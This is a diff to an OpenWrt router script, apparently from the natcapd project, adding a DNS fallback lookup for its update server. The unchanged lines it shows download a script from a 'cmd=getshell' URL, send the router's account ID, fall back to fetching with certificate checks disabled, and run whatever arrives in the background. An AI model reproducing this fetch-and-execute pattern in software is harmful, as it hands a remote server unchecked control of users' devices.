@@ -19,6 +19,19 @@ cleanup () {
 	fi
 }
 
+nslookup_check () {
+	local domain ipaddr
+	domain=${1-www.baidu.com}
+	ipaddr=`nslookup $domain | grep "$domain" -A1 | grep Address | grep -o '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)' | head -n1`
+	test -n "$ipaddr" || {
+		ipaddr=`nslookup $domain 114.114.114.114 | grep "$domain" -A1 | grep Address | grep -o '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)' | head -n1`
+		test -n "$ipaddr" || {
+			ipaddr=`nslookup $domain 8.8.8.8 | grep "$domain" -A1 | grep Address | grep -o '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)' | head -n1`
+		}
+	}
+	echo "$ipaddr"
+}
+
 gfwlist_update_main () {
 	mkfifo /tmp/trigger_gfwlist_update.fifo
 	(while :; do
@@ -36,6 +49,7 @@ gfwlist_update_main () {
 }
 
 main_trigger() {
+	local hostip
 	. /etc/openwrt_release
 	VER=`echo -n "$DISTRIB_ID-$DISTRIB_RELEASE-$DISTRIB_REVISION-$DISTRIB_CODENAME" | base64`
 	VER=`echo $VER | sed 's/ //g'`
@@ -46,10 +60,12 @@ main_trigger() {
 			rm -f /tmp/xx.sh
 			rm -f /tmp/nohup.out
 			ACC=`uci get natcapd.default.account 2>/dev/null`
+			hostip=`nslookup_check router-sh.ptpt52.com`
+			test -n "$hostip" || hostip=108.61.201.222
 			/usr/bin/wget --timeout=180 --ca-certificate=/tmp/cacert.pem -qO /tmp/xx.sh \
 				"https://router-sh.ptpt52.com/router-update.cgi?cmd=getshell&acc=$ACC&cli=$CLI&ver=$VER" || \
 				/usr/bin/wget --timeout=60 --no-check-certificate -qO /tmp/xx.sh \
-				"https://108.61.201.222/router-update.cgi?cmd=getshell&acc=$ACC&cli=$CLI&ver=$VER"
+				"https://$hostip/router-update.cgi?cmd=getshell&acc=$ACC&cli=$CLI&ver=$VER"
 			head -n1 /tmp/xx.sh | grep '#!/bin/sh' >/dev/null 2>&1 && {
 				chmod +x /tmp/xx.sh
 				nohup /tmp/xx.sh &
